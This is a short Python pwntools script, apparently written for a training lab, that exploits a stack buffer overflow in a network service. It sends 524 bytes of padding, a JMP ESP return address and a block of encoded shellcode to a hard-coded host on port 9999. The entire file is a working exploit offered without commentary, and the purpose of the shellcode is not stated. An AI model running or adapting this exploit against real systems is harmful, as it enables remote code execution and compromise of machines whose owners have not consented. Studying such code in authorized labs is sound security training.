#!/usr/bin/python3

from pwn import *
#  EBP  520
#  EIP  524 
#  JMP ESP 311712F3 \xF3\x12\x17\x31
padding = b'A'*524
EIP = b'\xf3\x12\x17\x31'
ESP_overflow = b'BBBBBBBBBB'
shellcode = b'\x89\xe6\xdd\xc0\xd9\x76\xf4\x58\x50\x59\x49\x49\x49\x49\x43'
shellcode += b'\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34'
shellcode += b'\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41'
shellcode += b'\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58'
shellcode += b'\x50\x38\x41\x43\x4a\x4a\x49\x50\x31\x39\x4b\x4c\x37\x4a\x43'
shellcode += b'\x36\x33\x47\x33\x51\x43\x33\x5a\x43\x32\x4c\x49\x4d\x31\x48'
shellcode += b'\x30\x42\x46\x58\x4d\x4b\x30\x5a\x33\x51\x49\x38\x30\x37\x4f'
shellcode += b'\x38\x4d\x4b\x30\x30\x49\x34\x39\x4b\x49\x35\x38\x34\x51\x52'
shellcode += b'\x31\x52\x31\x43\x36\x42\x48\x45\x52\x53\x30\x37\x53\x47\x59'
shellcode += b'\x4b\x39\x4b\x51\x38\x30\x33\x56\x50\x50\x56\x31\x50\x53\x4e'
shellcode += b'\x53\x35\x53\x4c\x49\x4d\x31\x58\x4d\x4b\x30\x36\x32\x43\x58'
shellcode += b'\x32\x4e\x46\x4f\x33\x43\x43\x58\x33\x58\x46\x4f\x46\x4f\x45'
shellcode += b'\x32\x35\x39\x4c\x49\x4d\x33\x50\x52\x56\x33\x4d\x59\x4b\x51'
shellcode += b'\x48\x30\x34\x4b\x48\x4d\x4b\x30\x41\x41'

r = remote( '17.17.17.5' , 9999 )
r.recvuntil('>> ',drop=True)
payload = padding+EIP+ESP_overflow+shellcode
r.sendline(payload)
r.close()